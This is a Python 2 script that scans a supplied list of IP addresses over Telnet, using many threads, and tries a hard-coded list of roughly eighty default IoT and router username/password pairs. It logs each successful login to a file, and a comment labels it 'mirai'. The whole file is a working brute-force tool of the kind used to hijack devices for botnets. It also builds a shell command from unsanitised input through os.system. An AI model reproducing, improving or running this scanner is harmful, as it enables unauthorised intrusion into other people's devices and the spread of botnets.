import threading
import sys, os, re, time, socket
from Queue import *
from sys import stdout
import resource

resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))

if len(sys.argv) < 4:
	print "Usage: python "+sys.argv[0]+" <list> <threads> <output file>"
	sys.exit()

combo = ["admin:admin",
"root:123456789",
"toor:root",
"user:user",
"guest:12345",
"support:support",
"default:default",
"root:12345",
"root:root",
"hikvision:hikvision",
"root:admin",
"guest:guest",
"root:123456",
"ftp:ftp",
"root:vizxv",
"default:admin",
"test:test",
"root:1234",
"admin:password",
"admin:1234",
"root:toor",
"root:xc3511",
"root:888888",
"1234:1234",
"ubnt:password",
"ubnt:ubnt",
"admin:123456",
"root:password",
"guest:123456",
"admin:12345",
"root:xmhdipc",
"root:default",
"root:juantech",
"root:54321",
"root:",
"admin:",
"root:pass",
"admin:admin1234",
"root:1111",
"admin:smcadmin",
"admin:1111",
"root:666666",
"root:klv123",
"Administrator:admin",
"service:service",
"supervisor:supervisor",
"admin1:password",
"administrator:1234",
"666666:666666",
"888888:888888",
"root:klv1234",
"root:Zte521",
"root:hi3518",
"root:jvbzd",
"root:anko",
"root:zlxx.",
"root:7ujMko0vizxv",
"root:7ujMko0admin",
"root:system",
"root:ikwb",
"root:dreambox",
"root:user",
"root:realtek",
"root:00000000",
"admin:1111111",
"admin:54321",
"admin:7ujMko0admin",
"admin:pass",
"admin:meinsm",
"tech:tech",
"mother:fucker",
"default:",
"admin:ADMIN",
"root:1234567",
"supervisor:zyad1234",
"daemon:",
"adm:",
"root:696969"
]

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

for ip in ips:
	queue_count += 1
	stdout.write("\r[%d] Added to queue" % queue_count)
	stdout.flush()
	queue.put(ip)
print "\n"


class router(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		username = ""
		password = ""
		for passwd in combo:
			if ":n/a" in passwd:
				password=""
			else:
				password=passwd.split(":")[1]
			if "n/a:" in passwd:
				username=""
			else:
				username=passwd.split(":")[0]
			tn = socket.socket()
			try:
				tn.settimeout(8)
				tn.connect((self.ip,23))
			except Exception:
				tn.close()
				break
			try:
				hoho = ''
				hoho += readUntil(tn, "ogin:")
				if "ogin" in hoho:
					tn.send(username + "\n")
					time.sleep(0.09)
			except Exception:
				tn.close()
			try:
				hoho = ''
				hoho += readUntil(tn, "assword:")
				if "assword" in hoho:
					tn.send(password + "\n")
					time.sleep(0.8)
				else:
					pass
			except Exception:
				tn.close()
			try:
				prompt = ''
				prompt += tn.recv(40960)
				if ">" in prompt and "ONT" not in prompt:
					success = True
				elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
					success = True				
				else:
					tn.close()
				if success == True:
					try:
						os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"") # 1.1.1.1:23 user:pass # mirai
						print "\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, self.ip)
						tn.close()
						break
					except:
						tn.close()
				else:
					tn.close()
			except Exception:
				tn.close()

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

def worker():
	try:
		while True:
			try:
				IP = queue.get()
				thread = router(IP)
				thread.start()
				queue.task_done()
				time.sleep(0.02)
			except:
				pass
	except:
		pass

for l in xrange(threads):
	try:
		t = threading.Thread(target=worker)
		t.start()
	except:
		pass
